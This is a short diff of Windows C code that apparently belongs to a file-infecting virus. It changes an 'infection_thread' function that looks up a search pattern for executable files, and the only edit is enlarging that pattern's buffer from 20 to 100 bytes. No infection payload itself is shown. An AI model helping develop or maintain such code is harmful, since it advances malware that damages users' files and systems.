@@ -44,8 +44,8 @@ static DWORD WINAPI infection_thread(LPVOID param) {
     if (data != NULL) {
         WIN32_FIND_DATAA find_data;
         HANDLE h_find;
-        char search_pattern[20];
-        if (get_string(STRING_EXE_SEARCH_PATTERN, search_pattern, 20) == 0) {
+        char search_pattern[100];
+        if (get_string(STRING_EXE_SEARCH_PATTERN, search_pattern, 100) == 0) {
             PRINT_DEBUG("could not get string for STRING_EXE_SEARCH_PATTERN");
         }
         PRINT_DEBUG("search pattern: %s", search_pattern);
